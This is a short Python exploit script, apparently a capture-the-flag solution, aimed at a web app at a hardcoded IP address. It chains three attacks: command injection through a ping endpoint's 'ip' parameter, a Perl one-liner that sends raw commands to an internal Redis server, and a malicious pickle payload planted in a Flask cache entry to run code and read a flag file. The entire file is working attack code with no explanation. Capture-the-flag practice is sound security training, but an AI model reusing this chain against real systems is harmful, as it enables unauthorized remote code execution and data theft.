import requests

url = "http://34.126.213.161:5551/{}"

code = """open('flag').read()"""

def to_hex(st):
    out = ""
    for s in st:
        out += hex(ord(s)).replace('0x','\\x')
    return out

def buildPacket():
    pk = '!c__builtin__\neval\n(V{}\ntR.'.format(code)
    view = 'flask_cache_view//uploads/pewpewpewX'
    packet = f"""*3\r\n$3\r\nSET\r\n${len(view)}\r\n{view}\r\n${len(pk)}\r\n{pk}\r\n"""
    return to_hex(packet)

pack = buildPacket()
perl = """use IO::Socket;my $REMOTE = new IO::Socket::INET(PeerAddr => "redis", PeerPort => "6379",Proto => "tcp", Timeout => "1", Blocking => "0");$REMOTE->autoflush(1);print $REMOTE "{}";close($REMOTE);""".format(pack)

def rce(cmd):
    r = requests.get(url.format('cgi/ping?ip=1.1.1.1;{}'.format(cmd)))
    return r.text

cmd = "perl -e '{}'".format(perl)
print(rce(cmd))
print(requests.get(url.format('uploads/pewpewpewX')).text)